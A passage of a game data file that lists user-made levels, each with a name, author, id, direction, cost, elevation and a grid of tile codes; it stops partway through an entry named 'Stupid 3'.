maps.push({name="Watch your diagonal",author="Luffaren",id="#1666193066",direction="forward",cost=78,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,5,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,89,0,5,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,89,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,5,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Eye of Wrath",author="Mini",id="#1666193578",direction="forward",cost=239,elevation=14,map=[0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,109,90,1,1,1,0,0,0,0,0,0,0,0,0,1,90,105,114,90,109,109,109,109,120,90,1,0,0,0,0,0,0,0,1,114,110,123,123,56,116,49,49,109,110,120,122,1,0,0,0,0,0,0,1,90,123,123,56,56,1,1,49,49,109,110,90,1,0,0,0,0,0,0,1,113,123,55,56,1,1,1,1,49,50,109,120,1,0,0,0,0,0,0,1,105,123,55,1,79,78,78,79,1,50,109,90,1,0,0,0,0,0,0,1,113,123,55,1,78,124,124,79,1,50,109,120,1,0,0,0,0,0,0,1,105,123,54,1,79,78,124,78,1,51,109,120,1,0,0,0,0,0,0,1,110,123,54,1,79,78,78,78,1,51,109,122,1,0,0,0,0,0,0,1,105,123,54,53,1,1,1,1,52,51,109,120,1,0,0,0,0,0,0,1,110,123,123,53,53,1,1,52,52,124,119,122,1,0,0,0,0,0,0,1,90,110,123,123,53,53,52,52,124,109,120,90,1,0,0,0,0,0,0,0,1,114,110,123,123,123,123,105,109,90,122,1,0,0,0,0,0,0,0,0,0,1,1,1,123,123,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,90,123,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,123,123,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="marathon",author="chinny",id="#1666221574",direction="forward",cost=246,elevation=0,map=[19,19,0,0,0,0,19,19,19,0,0,0,0,19,19,19,0,0,2,2,14,14,14,90,14,14,14,14,14,14,14,14,14,14,14,90,14,14,14,14,14,14,14,14,14,14,90,14,14,90,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,19,19,19,19,0,0,0,19,19,19,19,0,0,0,19,19,19,19,14,14,14,90,14,14,14,14,14,14,14,90,14,14,14,14,14,14,90,14,14,14,14,14,14,14,14,90,14,14,14,14,14,14,90,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,19,19,0,0,0,0,19,19,19,0,0,0,0,19,19,19,0,0,14,14,14,14,14,14,14,14,14,14,14,90,14,14,14,14,14,14,14,14,90,14,90,14,14,14,14,90,14,14,14,14,14,14,90,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,19,19,19,19,0,0,0,19,19,19,19,0,0,0,19,19,19,19,14,14,14,14,14,90,14,14,14,14,14,14,14,14,90,14,14,14,14,14,90,14,14,14,14,14,14,14,90,14,14,14,14,14,14,14,90,14,2,2]});
maps.push({name="choose wisely",author="chinny",id="#1666221597",direction="forward",cost=290,elevation=0,map=[0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,0,0,1,9,9,96,9,14,14,95,14,14,95,14,14,9,98,9,9,1,0,0,1,9,9,96,9,141,14,95,14,14,95,14,141,9,98,9,9,1,0,0,1,9,9,1,1,1,1,1,1,1,1,1,1,1,1,9,9,1,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,1,9,9,1,0,0,0,0,0,0,0,93,11,92,0,9,9,0,11,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,92,92,1,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,92,92,1,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,92,92,1,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,92,92,1,0,0,1,9,9,1,0,0,0,0,0,0,0,93,11,92,0,9,9,0,11,0,1,9,9,1,0,0,0,0,0,0,0,0,0,0,1,9,9,1,0,0,1,9,9,1,1,1,1,1,1,1,1,1,1,1,1,9,9,1,0,0,1,9,9,141,14,14,14,97,14,14,99,14,14,14,141,9,9,1,0,0,1,9,9,141,14,14,14,14,14,14,14,14,14,14,141,9,9,1,0,0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,0]});
maps.push({name="Abandoned Project",author="Mini",id="#1666295892",direction="forward",cost=170,elevation=10,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,32,32,12,0,0,0,0,0,0,0,0,0,94,9,30,31,32,33,12,90,12,12,12,12,33,32,31,30,9,94,0,0,94,9,30,31,32,33,12,12,12,12,90,12,33,32,31,30,9,94,0,0,0,0,0,0,0,0,33,90,12,12,12,33,0,0,0,0,0,0,0,0,0,0,0,0,0,34,33,33,12,90,33,33,34,0,0,0,0,0,0,0,0,0,0,0,35,34,34,0,0,0,0,34,34,35,0,0,0,0,0,0,0,0,0,36,35,35,0,0,0,0,0,0,35,35,36,0,0,0,0,0,0,0,37,36,36,0,0,0,0,0,0,0,0,36,36,37,0,0,0,0,0,38,37,37,0,0,0,0,0,0,0,0,0,0,37,37,38,0,0,0,39,38,38,0,0,0,0,0,0,0,0,0,0,0,0,38,38,39,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,40,40,0,0,0,0,0,0,24,24,0,0,0,0,0,0,40,40,0,0,21,21,0,0,0,0,0,24,24,90,24,0,0,0,0,0,21,21,0,21,90,21,21,42,43,44,24,90,24,24,24,24,44,43,42,21,21,90,21,21,21,90,21,42,43,44,90,24,24,24,90,24,44,43,42,21,90,21,21,0,21,21,0,0,0,0,0,24,24,24,24,0,0,0,0,0,21,21,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Bounce Back",author="Headhunterz",id="#1666304768",direction="forward",cost=379,elevation=17,map=[1,2,2,20,20,1,1,1,1,1,1,40,97,40,1,1,1,1,1,1,1,5,5,20,93,1,94,15,14,14,14,14,54,14,13,13,13,13,94,1,1,5,5,20,93,1,15,15,14,131,14,14,114,14,13,131,13,13,13,1,1,5,5,20,93,1,15,15,0,0,0,0,1,0,0,0,0,12,12,1,1,5,5,20,93,1,15,15,0,1,1,1,1,1,1,1,0,12,12,1,1,5,5,20,93,1,131,15,0,1,1,1,1,1,1,1,0,12,12,1,1,5,5,1,1,1,15,15,0,1,133,96,19,94,1,1,0,131,12,1,1,5,5,133,20,1,15,15,0,1,19,96,19,19,1,1,0,12,12,1,1,6,6,20,93,1,15,15,0,1,24,0,19,19,1,1,0,11,11,1,1,6,6,20,93,1,15,131,0,0,93,0,19,19,1,1,1,111,51,1,1,131,6,20,93,1,15,15,0,0,0,0,18,18,1,1,0,11,11,1,1,6,6,20,93,1,16,16,16,16,131,16,17,17,1,1,0,131,11,1,1,6,6,20,93,1,94,16,16,16,16,16,17,17,1,1,0,11,11,1,1,46,106,1,1,1,1,1,1,1,1,1,1,1,1,1,0,10,10,1,1,6,6,0,0,1,1,1,1,1,1,1,1,1,1,1,0,10,10,1,1,7,7,0,0,0,0,0,0,0,0,1,0,0,0,0,0,10,10,1,1,7,131,7,7,8,8,8,8,8,9,109,9,9,131,9,10,131,10,1,1,7,7,7,7,8,8,131,8,8,9,49,9,9,9,9,10,10,94,1,1,94,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,134,22,94,22,93,22,2,2]});
maps.push({name="Sky City",author="sivi",id="#1666306859",direction="forward",cost=308,elevation=13,map=[0,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,0,0,90,3,3,90,5,5,5,5,5,5,5,5,5,5,90,3,3,90,0,0,24,58,58,24,5,5,5,5,5,5,5,5,5,5,24,58,58,24,0,24,90,58,58,90,24,90,5,94,5,5,94,5,90,24,90,58,58,90,24,24,58,58,58,58,58,38,38,85,38,38,38,38,38,58,58,58,58,58,24,24,58,58,87,58,58,38,38,38,38,38,85,38,38,58,58,87,58,58,24,24,90,58,58,90,24,0,0,0,0,0,0,0,0,24,90,58,58,90,24,0,24,58,58,24,0,0,0,0,0,0,0,0,0,0,24,58,58,24,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,0,85,38,0,0,0,67,90,126,126,90,67,0,0,0,38,85,0,0,0,0,38,38,0,0,0,14,14,14,14,14,14,0,0,0,38,38,0,0,0,0,38,38,0,0,0,14,14,93,93,14,14,0,0,0,38,38,0,0,0,0,38,85,0,0,0,67,90,14,14,90,67,0,0,0,85,38,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,24,58,58,24,0,0,0,0,0,0,0,0,0,0,24,58,58,24,0,24,90,58,58,90,24,0,0,0,0,0,0,0,0,24,90,58,58,90,24,24,58,58,87,58,58,38,85,38,18,18,38,38,38,58,58,87,58,58,24,24,58,58,58,58,58,38,38,38,18,18,38,85,38,58,58,58,58,58,24,24,90,58,58,90,24,0,0,0,18,18,0,0,0,24,90,58,58,90,24,0,24,24,24,24,0,0,0,0,2,2,0,0,0,0,24,24,24,24,0]});
maps.push({name="Secret passage Lite",author="Dogeeri",id="#1666328110",direction="right",cost=555,elevation=-8,map=[96,65,66,37,91,38,2,2,38,91,37,66,65,96,1,1,1,0,0,0,127,1,71,37,91,38,38,38,38,91,37,71,1,127,1,144,1,0,0,0,0,1,71,37,91,37,37,37,37,91,37,71,1,0,1,144,1,0,0,0,0,0,71,37,37,1,142,142,1,37,37,71,0,0,1,144,1,0,0,0,0,0,71,37,37,37,37,37,37,37,37,71,0,0,1,144,1,0,0,0,0,0,71,37,16,16,16,16,16,90,37,71,0,0,1,144,1,0,0,0,0,1,71,37,16,75,75,75,16,16,37,71,1,0,1,144,1,0,0,0,0,0,1,37,16,140,140,75,75,16,37,1,0,0,1,144,1,0,0,0,135,135,1,37,16,75,75,75,75,16,37,1,135,135,1,144,1,0,0,0,129,135,135,37,16,75,75,75,16,16,37,135,135,128,1,144,1,0,0,0,1,1,1,1,1,75,55,75,1,1,1,1,1,1,1,144,1,1,1,1,116,116,90,116,90,116,56,116,1,93,94,133,144,144,144,144,144,144,144,1,89,56,56,56,56,56,56,91,1,144,1,1,1,1,1,1,1,1,1,1,116,56,116,116,116,116,91,97,1,144,1,132,142,111,11,10,10,9,65,67,89,56,1,1,1,1,1,1,1,131,1,134,142,111,11,10,89,65,65,67,116,56,1,131,91,21,144,144,93,94,1,1,1,111,11,88,65,65,65,65,89,56,1,1,21,1,1,1,1,1,1,0,0,111,11,10,65,65,65,2,116,56,116,116,56,116,95,91,142,115,114,113,112,111,11,88,65,65,65,2,89,56,56,56,56,116,95,91,143,115,114,113,112,111,11,10,89,65,65,65,116,116,90,116,90,116,95,91,142,115,114,113,112,90,90,10,9,9,65,67]});
maps.push({name="Boost islands",author="Luffaren",id="#1666329978",direction="left",cost=300,elevation=19,map=[0,14,14,14,9,9,9,9,9,0,0,0,0,0,0,0,0,2,2,5,0,14,14,14,9,125,9,9,9,9,0,0,0,0,0,0,5,5,5,5,14,14,14,14,9,9,9,9,9,9,0,0,0,0,67,5,5,5,5,5,14,14,14,14,14,9,9,89,9,9,29,0,0,0,67,5,5,5,5,0,14,89,14,14,14,9,9,9,9,9,9,29,0,0,0,128,5,5,5,5,14,14,14,14,14,34,0,0,9,9,9,29,0,0,0,5,5,5,94,5,14,14,14,14,14,14,67,0,0,9,9,0,0,0,0,0,5,94,5,94,14,14,14,14,14,14,67,0,0,0,29,0,0,0,0,0,0,5,5,5,0,14,14,89,14,14,14,67,0,0,0,0,0,0,0,0,0,5,5,0,0,67,14,14,14,14,14,67,0,0,0,0,0,67,14,14,0,0,0,0,0,67,14,14,14,14,129,0,0,0,0,0,34,14,14,14,14,14,0,0,0,0,0,14,14,14,14,67,0,0,0,0,34,14,14,14,14,14,14,0,0,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,89,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,67,14,14,14,14,14,14,0,0,67,67,0,0,0,67,67,0,0,0,0,0,0,0,14,14,14,14,0,44,24,24,44,44,0,19,19,0,0,0,0,0,0,0,0,14,89,14,24,24,24,24,24,24,19,19,19,39,0,0,0,0,67,14,14,14,14,14,2,24,24,89,24,24,19,125,19,19,67,0,0,0,128,14,14,14,14,93,2,24,24,24,24,24,19,19,19,19,67,0,0,0,14,14,14,14,14,93,24,24,24,24,44,0,67,19,39,39,0,0,0,0,0,14,14,14,93,0]});
maps.push({name="Teleport for Trigger",author="TF2 Pencil",id="#1666341275",direction="forward",cost=271,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,15,15,15,15,15,15,15,15,15,1,0,0,0,0,0,0,0,0,9,9,15,133,15,15,15,15,15,132,15,1,0,0,0,0,0,0,0,0,9,9,15,15,15,15,15,15,15,15,15,1,0,0,0,0,0,0,0,0,9,9,1,1,1,1,1,1,1,1,1,1,0,0,0,29,29,29,29,0,9,9,1,1,1,1,1,1,1,1,1,1,0,0,0,29,0,0,0,0,9,9,15,15,15,15,15,15,15,15,15,1,0,0,0,0,0,0,0,0,9,9,15,136,15,15,93,15,15,134,15,1,0,0,9,9,9,0,0,0,9,9,15,15,15,15,15,15,15,15,15,1,0,0,9,131,9,0,0,0,9,9,1,1,1,1,1,1,1,1,1,1,0,0,9,9,9,0,0,0,9,9,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,9,9,15,15,15,15,15,15,15,15,15,1,0,0,0,0,0,0,0,0,9,9,15,138,15,15,94,15,15,137,15,1,0,0,0,0,0,0,0,0,9,9,15,15,15,15,15,15,15,15,15,1,0,0,0,0,0,0,0,0,9,9,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,9,9,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,9,9,15,15,15,15,15,15,15,15,15,1,0,0,9,9,9,96,96,96,9,9,15,97,15,15,15,15,15,139,15,1,0,0,9,9,9,96,96,96,9,9,15,15,15,15,15,15,15,15,15,1,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Zig Zag Waves",author="TF2 Pencil",id="#1666341379",direction="forward",cost=562,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,66,72,71,72,71,72,71,72,71,72,71,72,71,66,14,14,0,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Crowded Rooms 1",author="TF2 Pencil",id="#1666341417",direction="right",cost=188,elevation=13,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,1,1,1,1,0,0,0,0,1,1,1,1,1,1,0,0,0,0,1,9,9,9,9,1,0,0,0,0,1,119,120,121,122,1,0,0,0,0,1,9,9,9,4,54,34,97,0,0,1,118,22,22,122,122,22,2,0,0,1,9,9,9,9,1,0,0,0,0,1,117,22,22,122,122,22,2,0,0,1,3,9,9,9,1,0,0,0,0,1,116,115,114,114,1,0,0,0,0,1,14,1,1,1,1,0,0,0,0,1,1,1,114,1,1,0,0,0,0,0,96,0,0,0,99,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,34,0,0,37,37,0,0,0,94,40,38,36,34,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,93,40,38,36,34,0,0,0,0,0,0,0,34,0,0,37,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,1,14,1,1,17,1,0,0,0,0,1,1,1,14,1,1,0,0,0,0,1,9,9,9,17,98,98,37,37,37,57,57,1,14,14,1,0,0,0,0,1,9,9,9,16,1,0,0,0,0,1,57,1,1,57,1,0,0,0,0,1,10,9,9,15,1,0,0,0,0,1,57,1,57,57,1,0,0,0,0,1,11,12,13,14,1,0,0,0,0,1,57,57,57,57,1,0,0,0,0,1,1,1,1,1,1,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Stupid 1",author="TF2 Pencil",id="#1666341464",direction="forward",cost=159,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,1,14,14,0,0,0,0,0,0,0,0,92,14,14,0,0,0,0,0,0,1,14,14,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,1,14,14,92,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,1,14,14,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,1,14,14,0,0,0,0,0,0,0,0,92,14,14,0,0,0,0,0,0,1,14,14,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,1,14,14,92,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,1,14,14,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,1,14,14,0,0,0,0,0,0,0,0,92,14,14,0,0,0,0,0,0,1,14,14,1,1,1,1,1,1,1,1,1,14,14,0,0,0,0,0,0,1,14,14,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="WallaWallaBingBang",author="Luffaren",id="#1666346836",direction="forward",cost=519,elevation=-3,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,124,124,1,66,5,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,5,66,66,66,66,5,5,5,66,66,66,66,66,66,66,66,66,66,66,5,5,66,66,66,66,5,5,5,66,66,66,66,66,66,66,66,66,66,66,5,5,66,66,66,66,6,6,94,66,66,66,66,66,66,66,66,66,66,66,5,5,66,66,66,66,7,7,5,66,66,66,66,66,66,66,66,66,66,66,5,5,66,66,66,66,8,8,5,66,66,66,66,66,66,66,66,66,66,66,5,1,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,90,1,1,0,1,90,8,8,8,8,8,8,8,8,8,8,8,93,8,8,1,0,0,0,0,1,90,8,8,8,8,15,14,13,12,11,10,9,8,8,1,0,0,0,0,0,1,8,90,8,92,15,16,17,18,19,20,21,8,90,1,0,0,0,0,0,1,21,21,21,21,21,21,21,21,21,86,21,21,1,0,0,0,0,0,0,0,1,90,21,21,86,21,86,21,86,21,21,1,0,0,0,0,0,0,0,0,0,1,90,21,88,21,88,86,21,21,21,1,0,0,0,0,0,0,0,0,0,0,1,90,21,86,21,21,21,21,90,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,90,2,2,90,1,0,0,0,0,0]});
maps.push({name="Delusion",author="Mini",id="#1666361298",direction="left",cost=329,elevation=0,map=[1,1,1,1,1,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,1,133,6,94,8,108,19,19,18,18,18,17,17,17,16,16,16,15,15,15,1,6,6,7,8,108,19,19,18,18,18,17,17,17,16,16,16,15,131,15,1,94,7,7,8,108,19,19,18,18,18,17,17,17,16,16,16,15,15,15,1,8,8,8,8,108,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,108,108,108,108,95,95,0,0,0,0,0,0,0,0,0,0,141,44,93,2,19,19,19,1,95,8,48,34,34,34,34,34,34,34,34,0,0,44,44,2,19,19,19,1,0,48,48,48,34,34,34,34,34,34,34,34,0,0,0,0,18,18,18,1,0,34,48,8,95,0,0,0,0,34,34,34,34,0,0,0,18,18,18,1,0,34,34,95,8,8,0,0,0,0,34,34,34,34,0,0,18,18,18,1,0,34,34,0,8,8,95,0,0,0,0,34,34,34,34,0,17,17,17,1,0,34,34,0,0,95,8,48,0,0,0,0,34,34,34,0,17,17,17,1,0,34,34,0,0,0,48,48,48,0,0,0,34,34,34,0,17,17,17,1,0,34,34,0,0,0,0,48,8,95,0,0,34,134,1,0,16,16,16,1,0,34,34,34,0,0,0,0,95,95,108,108,108,108,1,0,16,16,16,1,0,34,34,34,34,0,0,0,0,108,8,8,8,8,1,0,16,16,16,1,0,0,34,34,34,34,0,0,0,108,8,7,7,94,1,0,15,15,15,1,141,0,0,34,34,34,34,34,34,108,8,7,6,6,1,0,15,137,15,1,44,44,0,0,34,34,34,34,136,108,8,94,6,132,1,0,15,15,15,1,93,44,0,0,0,34,34,34,1,1,1,1,1,1,1]});
maps.push({name="Mirrored In",author="Mini",id="#1666363929",direction="forward",cost=210,elevation=0,map=[0,93,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,12,12,0,0,16,16,16,16,16,17,17,0,86,18,18,19,85,1,0,0,12,12,0,0,16,16,16,16,16,17,85,0,18,18,18,19,19,1,0,0,85,12,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,0,12,12,0,0,15,15,0,0,1,22,22,23,23,23,1,20,20,1,0,0,13,13,0,0,15,85,0,0,1,22,22,23,23,23,1,85,20,1,0,0,13,13,0,0,14,14,0,0,1,21,21,0,0,0,1,20,20,1,0,0,0,0,0,0,86,14,0,0,1,86,86,1,24,24,1,21,21,1,0,0,14,14,0,0,14,14,0,0,1,21,21,1,24,24,1,86,86,1,0,0,14,86,0,0,0,0,0,0,1,20,20,1,0,0,0,21,21,1,0,0,14,14,0,0,13,13,0,0,1,20,85,1,23,23,23,22,22,1,0,0,85,15,0,0,13,13,0,0,1,20,20,1,23,23,23,22,22,1,0,0,15,15,0,0,12,12,0,0,1,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,12,85,0,0,1,19,19,18,18,18,0,85,17,16,16,16,16,16,0,0,12,12,0,0,1,85,19,18,86,18,0,17,17,16,16,16,16,16,0,0,12,12,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,94,0]});
maps.push({name="Crowded Rooms 2",author="TF2 Pencil",id="#1666427274",direction="forward",cost=164,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,53,53,1,1,0,0,0,1,1,1,1,0,0,1,102,113,113,1,0,0,1,53,53,53,33,0,0,1,13,13,113,113,0,1,1,1,113,1,0,0,1,53,53,1,97,0,0,1,13,13,1,113,113,113,113,113,113,1,0,0,1,96,1,1,0,0,0,1,91,91,1,0,0,0,1,101,101,1,0,0,0,13,0,0,0,0,0,0,13,13,0,0,0,0,0,13,0,0,0,0,0,13,0,0,0,0,0,0,13,13,0,0,0,0,0,13,0,0,0,0,0,13,0,0,0,0,0,0,91,91,0,0,0,0,0,13,0,0,0,0,0,13,0,0,0,0,0,0,13,13,0,0,0,0,0,13,0,0,0,0,1,13,1,1,0,0,0,1,91,91,1,0,0,0,1,13,1,1,0,0,1,13,13,1,0,0,0,1,91,91,1,0,0,0,1,13,13,1,0,0,1,13,13,0,13,13,13,13,13,13,1,0,33,0,13,13,13,1,0,0,1,1,1,1,0,0,0,1,1,1,1,0,104,0,1,1,103,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Stupid 3",author="TF2 